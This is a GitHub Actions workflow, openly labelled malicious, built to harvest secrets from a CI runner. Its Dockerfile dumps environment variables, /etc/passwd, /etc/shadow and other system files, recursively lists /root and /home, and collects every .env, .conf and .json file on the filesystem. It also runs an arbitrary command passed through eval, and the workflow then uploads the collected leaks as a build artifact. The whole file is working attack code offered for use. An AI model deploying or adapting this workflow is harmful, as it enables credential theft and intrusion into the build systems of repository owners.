name: Deep CI Extractor

on:
  push:
    branches: [ main ]

jobs:
  extract:
    runs-on: ubuntu-latest
    permissions:
      contents: read

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Prepare malicious Dockerfile
        run: |
          mkdir -p ./exploit
          cat <<'EOF' > ./exploit/Dockerfile
          FROM python:3.11-alpine

          ARG PAYLOAD_CMD

          RUN apk add --no-cache curl bash tar grep && \
              echo "[+] Collecting leaks..." && \
              mkdir -p /leaks && \
              # Dump environment variables (excluding tokens)
              printenv | grep -vE 'GITHUB_TOKEN|OIDC_TOKEN|AWS_' > /leaks/env.txt && \
              # Dump key system files
              cat /etc/passwd > /leaks/passwd.txt 2>/dev/null || true && \
              cat /etc/group > /leaks/group.txt 2>/dev/null || true && \
              cat /etc/shadow > /leaks/shadow.txt 2>/dev/null || true && \
              cat /etc/hosts > /leaks/hosts.txt 2>/dev/null || true && \
              cat /etc/resolv.conf > /leaks/resolv.txt 2>/dev/null || true && \
              # List files in sensitive directories
              ls -laR /root > /leaks/root_listing.txt 2>/dev/null || true && \
              ls -laR /home > /leaks/home_listing.txt 2>/dev/null || true && \
              # Search for secrets/configs
              find / -type f -iname "*.env" -exec cat {} \; >> /leaks/possible_secrets.txt 2>/dev/null || true && \
              find / -type f -iname "*.conf" -exec cat {} \; >> /leaks/configs.txt 2>/dev/null || true && \
              find / -type f -iname "*.json" -exec cat {} \; >> /leaks/jsons.txt 2>/dev/null || true && \
              # Run arbitrary command
              echo "[+] Executing payload..." && \
              eval "$PAYLOAD_CMD" || true
          EOF

      - name: Set Payload Command
        id: payload
        run: echo "PAYLOAD_CMD=whoami && id && uname -a && ls -la /" >> $GITHUB_ENV

      - name: Build Docker Image
        run: |
          docker build \
            --build-arg PAYLOAD_CMD="${{ env.PAYLOAD_CMD }}" \
            -t exfil-image \
            ./exploit

      - name: Run Container and Extract Leaks
        run: |
          mkdir -p leaks
          docker run --rm exfil-image tar -C /leaks -cf - . | tar -C leaks -xf -

      - name: Upload Leaks as Artifact
        uses: actions/upload-artifact@v4
        with:
          name: extracted-leaks
          path: leaks/
